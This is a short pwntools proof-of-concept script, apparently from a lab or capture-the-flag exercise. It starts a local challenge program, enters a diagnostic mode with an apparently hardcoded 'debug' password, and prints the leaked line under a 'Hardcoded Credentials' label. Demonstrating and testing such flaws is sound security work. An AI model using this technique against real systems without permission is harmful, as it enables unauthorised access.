#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'run_diagnostic')
    pid.recv(timeout=1.0)
    pid.sendline(b'debug')
    line = pid.recvlines(timeout=1.0)

    print(text.red("[+]") + " Vuln Harcoded Credentials - run_diagnostic:")
    print(line[1].decode()[19:])
    print()


if __name__ == "__main__":
    main()